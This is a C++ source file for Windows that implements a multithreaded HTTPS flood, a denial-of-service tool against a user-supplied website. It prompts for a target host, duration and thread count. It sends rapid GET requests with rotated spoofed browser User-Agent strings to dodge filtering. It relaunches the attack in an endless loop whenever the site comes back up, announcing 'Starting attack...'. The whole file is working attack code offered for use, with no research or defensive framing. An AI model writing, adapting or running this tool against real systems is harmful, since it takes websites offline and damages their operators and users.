#include <iostream>
#include <thread>
#include <vector>
#include <windows.h>
#include <winhttp.h>
#include <chrono>
#include <string>
#include <sstream>

#pragma comment(lib, "winhttp.lib")

using namespace std;

const vector<wstring> userAgents = {
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    L"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    L"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/537.36"
};

bool isWebsiteUp(const wstring& targetHost) {
    HINTERNET hSession = WinHttpOpen(L"WinHTTP Client", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) {
        cerr << "WinHttpOpen failed: " << GetLastError() << endl;
        return false;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, targetHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        cerr << "WinHttpConnect failed: " << GetLastError() << endl;
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        cerr << "WinHttpOpenRequest failed: " << GetLastError() << endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD statusCode = 0;
            DWORD statusCodeSize = sizeof(statusCode);
            if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL)) {
                if (statusCode >= 200 && statusCode < 400) {
                    WinHttpCloseHandle(hRequest);
                    WinHttpCloseHandle(hConnect);
                    WinHttpCloseHandle(hSession);
                    return true;
                }
            }
            else {
                cerr << "WinHttpQueryHeaders failed: " << GetLastError() << endl;
            }
        }
        else {
            cerr << "WinHttpReceiveResponse failed: " << GetLastError() << endl;
        }
    }
    else {
        cerr << "WinHttpSendRequest failed: " << GetLastError() << endl;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return false;
}

void sendHTTPSFlood(const wstring& targetHost, int duration) {
    auto start = chrono::steady_clock::now();
    while (chrono::steady_clock::now() - start < chrono::seconds(duration)) {
        HINTERNET hSession = WinHttpOpen(L"WinHTTP Client", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
        if (!hSession) {
            cerr << "WinHttpOpen failed: " << GetLastError() << endl;
            continue;
        }

        HINTERNET hConnect = WinHttpConnect(hSession, targetHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) {
            cerr << "WinHttpConnect failed: " << GetLastError() << endl;
            WinHttpCloseHandle(hSession);
            continue;
        }

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (!hRequest) {
            cerr << "WinHttpOpenRequest failed: " << GetLastError() << endl;
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            continue;
        }

        wstring userAgent = userAgents[rand() % userAgents.size()];
        wstring header = L"User-Agent: " + userAgent;
        if (!WinHttpAddRequestHeaders(hRequest, header.c_str(), static_cast<DWORD>(header.size()), WINHTTP_ADDREQ_FLAG_ADD)) {
            cerr << "WinHttpAddRequestHeaders failed: " << GetLastError() << endl;
        }

        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
            WinHttpReceiveResponse(hRequest, NULL);
        }
        else {
            cerr << "WinHttpSendRequest failed: " << GetLastError() << endl;
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
    }
}

int main() {
    wstring targetHost;
    int duration, threadCount;

    wcout << L"Enter server URL (e.g., random-server.onrender.com Just Remove https://): ";
    getline(wcin, targetHost);

    cout << "Enter duration (seconds): ";
    cin >> duration;
    cout << "Enter number of threads: ";
    cin >> threadCount;

    while (true) {
        if (isWebsiteUp(targetHost)) {
            cout << "Website is up. Starting attack...\n";
            vector<thread> threads;
            for (int i = 0; i < threadCount; ++i) {
                threads.emplace_back(sendHTTPSFlood, targetHost, duration);
            }

            for (auto& t : threads) t.join();
            cout << "Attack completed!\n";
        }
        else {
            cout << "Website is down. Retrying in 10 seconds...\n";
            this_thread::sleep_for(chrono::seconds(10));
        }
    }

    return 0;
}